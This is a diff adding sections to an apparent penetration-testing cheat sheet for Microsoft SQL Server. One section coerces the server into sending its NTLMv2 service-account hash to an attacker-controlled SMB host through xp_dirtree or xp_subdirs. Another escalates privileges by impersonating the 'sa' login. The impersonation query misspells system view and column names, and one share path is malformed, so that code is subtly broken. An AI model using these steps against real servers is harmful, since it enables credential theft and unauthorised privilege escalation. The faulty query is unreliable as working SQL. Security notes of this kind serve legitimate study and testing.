@@ -103,6 +103,39 @@ SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents
 GO
 ```
 
+### Stealing the MSSQL Service Account Hash
+Using [[Responder]] or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) we can utilise either of the `xp_subdirs` or `xp_dirtree` *undocumented* stored procedures. They utilise SMB to retrieve a list of child directories under a parent dir on the file system. If we point one of these procedures to our SMB server, we can force the SQL Server to authenticate and send the NTLMv2 hash.
+```sql
+1> EXEC master..xp_dirtree '\\<SMB_SERVER>\share'
+2> GO
+
+1> EXEC master..xp_subdirs '\\<SMB_SERVER\share'
+2> GO
+```
+
+### User Impersonation
+The `IMPERSONATE` permission allows you to take on the permissions of another user. This can lead to privilege escalation. Sysadmins can impersonate any user by default but for non-privileged users, permissions must be granted explicitly. To identify users we can impersonate with:
+```sql
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principles b
+ON a.grantor_principle_id = b.principle_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+We can check our user for sysadmin (a return value of `0` indicates we do NOT have the role, a `1` means we do):
+```SQL
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+Impersonating another user is done via:
+```sql
+EXECUTE AS LOGIN = 'sa'
+<CMD>
+GO
+```
+> You should run this in the masterDB as all users have access to this db and will prevent an error - `USE master`
 ## Enumeration Checklist
 
 | Goal                               | Command(s)                                                                                                                                                                                                                                                                                          | Refs                                                                                                                  |
